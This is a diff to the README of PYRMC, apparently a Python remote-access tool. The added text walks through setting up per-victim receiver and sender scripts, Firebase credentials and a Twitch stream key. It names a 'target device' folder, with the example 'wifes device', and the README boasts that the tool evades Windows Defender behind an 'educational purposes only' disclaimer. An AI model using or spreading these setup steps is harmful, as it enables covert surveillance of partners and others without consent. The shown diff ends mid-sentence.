@@ -16,7 +16,7 @@
 
 ![Recording 2024-05-04 154039](https://github.com/akbartaimurr/PYRMC/assets/134905706/2b818bf5-9840-418f-9013-f19e894cd31c)
 > [!WARNING]  
-> As the owner of PYRMC, I am not responsible of what you use the script or app for. Please use this for educational purposes only!
+> As the owner of PYRMC, I am not responsible of what you use the script or app for. Please use this tool for educational purposes only!
 
 ## Key Features
 
@@ -34,27 +34,56 @@
 * List files in directories
 > [!TIP]
 > BONUS: PYRMC does not get marked by Windows Defender!
+
+
 ## How To Use
 
-To clone and run this application, you'll need [Git](https://git-scm.com) and [Node.js](https://nodejs.org/en/download/) (which comes with [npm](http://npmjs.com)) installed on your computer. From your command line:
-
+To clone and run this script you'll need <a href="https://python.org">Python</a>. You can use any version after python3, You will also need PIP, which can be downloaded with python.
+After downloading python and pip, clone this repository or download this repo, then follow the following steps:
 ```bash
 # Clone this repository
-$ git clone https://github.com/amitmerchant1990/electron-markdownify
+ git clone https://github.com/akbartaimurr/PYRMC
 
 # Go into the repository
-$ cd electron-markdownify
+ cd PYRMC
 
 # Install dependencies
-$ npm install
+run requirements.bat
 
-# Run the app
-$ npm start
 ```
+After installing all the dependencies and requirements for this project, follow the steps below...
+<br>
+For each target device, you need a seperate `reciever.py` , `sender.py` and storage folder, so create a folder named for the target device you are aiming for
+example `wifes device`
 
-> **Note**
-> If you're using Linux Bash for Windows, [see this guide](https://www.howtogeek.com/261575/how-to-run-graphical-linux-desktop-applications-from-windows-10s-bash-shell/) or use `node` from the command prompt.
+After creating the folder, copy `reciever.py` and `sender.py` and `storage folder` to the folder you created (ex. `wifes device`)
+...
+Now, you need to get your firebase private key: (make sure you have created a project with a web app already)
+`https://console.firebase.google.com/project/yourproject/settings/serviceaccounts/adminsdk`
+Scroll down, click on python and then click on `generate new private key`
 
+It should download a `.json` file to your computer,
+rename the file cred.json and put it inside your `storage folder` inside the target device folder (ex. `wifes device`)
+
+### Step 2
+edit `reciever.py` to input your twitch values (lines 25-30):
+```python
+...
+
+cred = credentials.Certificate("storage/cred.json")  # Firebase Private Key Path
+firebase_admin.initialize_app(cred)
+db = firestore.client()
+
+# Initialize Twitch client with your client ID
+twitch_client = twitch.TwitchClient(client_id='')
+
+```
+(lines 191-192):
+```python
+        # Replace 'your_stream_key' with your actual Twitch stream key
+        stream_key = ''
+```
+(lines
 
 ## Download
 
